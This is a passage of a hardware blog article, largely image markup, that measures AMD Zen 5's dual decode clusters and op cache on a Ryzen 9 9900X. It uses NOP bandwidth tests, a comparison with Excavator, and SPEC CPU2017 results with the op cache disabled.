data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/9925e042-364d-45e2-9182-ed7732bb7bd9_2533x1357.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:780,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:1030696,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9925e042-364d-45e2-9182-ed7732bb7bd9_2533x1357.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9925e042-364d-45e2-9182-ed7732bb7bd9_2533x1357.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9925e042-364d-45e2-9182-ed7732bb7bd9_2533x1357.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9925e042-364d-45e2-9182-ed7732bb7bd9_2533x1357.png 1456w" sizes="100vw"></picture></div></a></figure></div><p><span>Here, I’m testing Zen 5 using the AMD Ryzen 9 9900X, which implements 12 Zen 5 cores in two 6-core clusters. I did an in-socket swap from my Ryzen 9 7950X3D, which means the 9900X is fed off the same DDR5-5600 setup I had from 2023. Performance results won’t be directly comparable to Ryzen 9 9950X figures from a </span><a href="https://chipsandcheese.com/p/discussing-amds-zen-5-at-hot-chips-2024" rel="">prior article</a><span>, because the 9950X had faster DDR5-6000.</span></p><p>To get a handle on how the frontend behaves in pure decoder mode, I fill an array with NOPs (instructions that do nothing) and jump to it. AMD’s fetch/decode path can handle 16 bytes per thread cycle in this test. AMD’s slides imply each fetch/decode pipe has a 32B/cycle path to the instruction cache, but I wasn’t able to achieve that when testing with 8 byte NOPs. Maybe there’s another pattern that achieves higher instruction bandwidth, but I’m mostly doing this as a sanity check to ensure the op cache isn’t in play.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F693afadc-4b79-47d2-a214-b30346371254_2171x1000.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F693afadc-4b79-47d2-a214-b30346371254_2171x1000.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F693afadc-4b79-47d2-a214-b30346371254_2171x1000.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F693afadc-4b79-47d2-a214-b30346371254_2171x1000.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F693afadc-4b79-47d2-a214-b30346371254_2171x1000.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F693afadc-4b79-47d2-a214-b30346371254_2171x1000.png" width="1456" height="671" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/693afadc-4b79-47d2-a214-b30346371254_2171x1000.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:671,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:341329,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F693afadc-4b79-47d2-a214-b30346371254_2171x1000.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F693afadc-4b79-47d2-a214-b30346371254_2171x1000.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F693afadc-4b79-47d2-a214-b30346371254_2171x1000.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F693afadc-4b79-47d2-a214-b30346371254_2171x1000.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Shorter 4 byte NOPs are more representative of typical instruction length, and stress decoder throughput rather than instruction cache bandwidth. Turning off the op cache limits a single thread to 4 IPC, as expected. Running two threads in the core, and thus using both decode clusters, brings total throughput to 8 IPC.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F56fc63eb-07eb-4ec9-94b0-6967c291e67e_2178x1003.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F56fc63eb-07eb-4ec9-94b0-6967c291e67e_2178x1003.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F56fc63eb-07eb-4ec9-94b0-6967c291e67e_2178x1003.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F56fc63eb-07eb-4ec9-94b0-6967c291e67e_2178x1003.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F56fc63eb-07eb-4ec9-94b0-6967c291e67e_2178x1003.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F56fc63eb-07eb-4ec9-94b0-6967c291e67e_2178x1003.png" width="1456" height="671" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/56fc63eb-07eb-4ec9-94b0-6967c291e67e_2178x1003.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:671,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:369994,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F56fc63eb-07eb-4ec9-94b0-6967c291e67e_2178x1003.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F56fc63eb-07eb-4ec9-94b0-6967c291e67e_2178x1003.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F56fc63eb-07eb-4ec9-94b0-6967c291e67e_2178x1003.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F56fc63eb-07eb-4ec9-94b0-6967c291e67e_2178x1003.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Across both patterns, Zen 5’s dual fetch pipes provide a huge increase in L1i miss bandwidth. Likely, each fetch pipe maintains an independent queue of L1i miss requests, allowing increased memory level parallelism with both threads active.</p><p>AMD’s Excavator architecture is an iterative improvement over Steamroller, and carries forward Steamroller’s clustered decode scheme. Excavator behaves much like Zen 5 as long as code fits within the instruction cache. But if the test spills out of L1i, Zen 5 behaves far better. Where Excavator has a single L1i fetch path feeding two decode clusters, Zen 5 duplicates the fetch paths too. That’s another key difference between Zen 5 and Steamroller/Excavator, besides Zen 5 having an op cache.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9597aa92-0ee5-452f-8a7f-35d880d6f0df_2165x1008.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9597aa92-0ee5-452f-8a7f-35d880d6f0df_2165x1008.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9597aa92-0ee5-452f-8a7f-35d880d6f0df_2165x1008.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9597aa92-0ee5-452f-8a7f-35d880d6f0df_2165x1008.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9597aa92-0ee5-452f-8a7f-35d880d6f0df_2165x1008.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9597aa92-0ee5-452f-8a7f-35d880d6f0df_2165x1008.png" width="1456" height="678" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/9597aa92-0ee5-452f-8a7f-35d880d6f0df_2165x1008.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:678,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:368486,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9597aa92-0ee5-452f-8a7f-35d880d6f0df_2165x1008.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9597aa92-0ee5-452f-8a7f-35d880d6f0df_2165x1008.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9597aa92-0ee5-452f-8a7f-35d880d6f0df_2165x1008.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9597aa92-0ee5-452f-8a7f-35d880d6f0df_2165x1008.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>With 8-byte NOPs though, Excavator can surprisingly give more L1i bandwidth to a single thread. That advantage goes away when both decoders pile onto the single fetch path, after which both Zen 5 and Excavator appear capped at 32 bytes per cycle.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff2f5d673-de9d-4e4c-8532-46f475f1c2d2_2174x1001.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff2f5d673-de9d-4e4c-8532-46f475f1c2d2_2174x1001.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff2f5d673-de9d-4e4c-8532-46f475f1c2d2_2174x1001.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff2f5d673-de9d-4e4c-8532-46f475f1c2d2_2174x1001.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff2f5d673-de9d-4e4c-8532-46f475f1c2d2_2174x1001.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff2f5d673-de9d-4e4c-8532-46f475f1c2d2_2174x1001.png" width="1456" height="670" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/f2f5d673-de9d-4e4c-8532-46f475f1c2d2_2174x1001.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:670,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:372261,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff2f5d673-de9d-4e4c-8532-46f475f1c2d2_2174x1001.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff2f5d673-de9d-4e4c-8532-46f475f1c2d2_2174x1001.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff2f5d673-de9d-4e4c-8532-46f475f1c2d2_2174x1001.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff2f5d673-de9d-4e4c-8532-46f475f1c2d2_2174x1001.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Excavator does enjoy slightly better L2 code bandwidth when both threads are loaded, but the bandwidth increase is nowhere near the 2x that Zen 5 enjoys. Excavator really wants to avoid fetching code from L2, and has a very large 96 KB instruction cache to avoid that. I’m also amazed that AMD’s old architecture could sustain 8 NOPs/cycle through the module’s pipeline. Special thanks goes to cha0shacker for running tests on his Excavator system.</p><p>SPEC CPU2017 is an industry standard benchmark suite, and is a good way to get a general idea of performance. Disabling the op cache drops Zen 5’s score by 20.3% and 16.8% in the integer and floating point suites, respectively. That’s a substantially heavier penalty than what I saw with Zen 4, where turning off the op cache reduced performance by 11.4% and 6.6% in the integer and floating point suites, respectively. Zen 5 is capable of higher throughput than Zen 4, and feeding a bigger core through a 4-wide decoder is more difficult.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7ce1cf21-ca08-424d-9d5d-e23e407c9c6d_1314x692.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7ce1cf21-ca08-424d-9d5d-e23e407c9c6d_1314x692.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7ce1cf21-ca08-424d-9d5d-e23e407c9c6d_1314x692.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7ce1cf21-ca08-424d-9d5d-e23e407c9c6d_1314x692.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7ce1cf21-ca08-424d-9d5d-e23e407c9c6d_1314x692.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7ce1cf21-ca08-424d-9d5d-e23e407c9c6d_1314x692.png" width="1314" height="692" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/7ce1cf21-ca08-424d-9d5d-e23e407c9c6d_1314x692.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:692,&quot;width&quot;:1314,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:299828,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7ce1cf21-ca08-424d-9d5d-e23e407c9c6d_1314x692.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7ce1cf21-ca08-424d-9d5d-e23e407c9c6d_1314x692.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7ce1cf21-ca08-424d-9d5d-e23e407c9c6d_1314x692.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7ce1cf21-ca08-424d-9d5d-e23e407c9c6d_1314x692.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>In the previous article, I also found Zen 4 suffered heavier losses from turning off the op cache when both SMT threads were active. Two threads expose more parallelism and enable higher throughput, making the 4-wide decoder even more of a bottleneck. Zen 5’s two decode clusters reverse the situation. Integer and floating point scores drop by 4.9% and 0.82% with the op cache off. For comparison, turning off Zen 4’s op cache leads to heavier 16% and 10.3% drops in the integer and floating point suites.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4fada582-68b6-4862-9298-67650b243f84_1311x934.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4fada582-68b6-4862-9298-67650b243f84_1311x934.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4fada582-68b6-4862-9298-67650b243f84_1311x934.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4fada582-68b6-4862-9298-67650b243f84_1311x934.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4fada582-68b6-4862-9298-67650b243f84_1311x934.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4fada582-68b6-4862-9298-67650b243f84_1311x934.png" width="1311" height="934" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/4fada582-68b6-4862-9298-67650b243f84_1311x934.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:934,&quot;width&quot;:1311,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:262103,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4fada582-68b6-4862-9298-67650b243f84_1311x934.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4fada582-68b6-4862-9298-67650b243f84_1311x934.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4fada582-68b6-4862-9298-67650b243f84_1311x934.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4fada582-68b6-4862-9298-67650b243f84_1311x934.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Zen 5 can reach very high IPC, especially when cache misses are rare and the core’s massive execution engine can be brought to bear. In those workloads, a single 4-wide decode cluster is plainly inadequate. Disabling the op cache in high IPC workloads like 548.exchange2 leads to downright devastating performance losses.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6ec71603-b981-4eb9-af15-7f3a898371d6_1667x1021.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6ec71603-b981-4eb9-af15-7f3a898371d6_1667x1021.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6ec71603-b981-4eb9-af15-7f3a898371d6_1667x1021.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6ec71603-b981-4eb9-af15-7f3a898371d6_1667x1021.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6ec71603-b981-4eb9-af15-7f3a898371d6_1667x1021.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6ec71603-b981-4eb9-af15-7f3a898371d6_1667x1021.png" width="1456" height="892" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/6ec71603-b981-4eb9-af15-7f3a898371d6_1667x1021.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:892,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:176003,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6ec71603-b981-4eb9-af15-7f3a898371d6_1667x1021.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6ec71603-b981-4eb9-af15-7f3a898371d6_1667x1021.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6ec71603-b981-4eb9-af15-7f3a898371d6_1667x1021.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6ec71603-b981-4eb9-af15-7f3a898371d6_1667x1021.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Lower IPC workloads are less affected, but overall penalties are generally heavier on Zen 5 than on Zen 4. For example, turning off Zen 4’s op cache dropped 502.gcc’s score by 6.35%. On Zen 5, doing the same drops the score by 13.7%.</p><p>Everything flips around once the second decoder comes into play with SMT. The op cache still often provides an advantage, thanks in part to its overkill bandwidth. Taken branches and alignment penalties can inefficiently use frontend bandwidth, and having extra bandwidth on tap is always handy.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb00fd0ac-5ad0-443c-b9d5-5778da42762c_1574x975.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb00fd0ac-5ad0-443c-b9d5-5778da42762c_1574x975.png 424w, 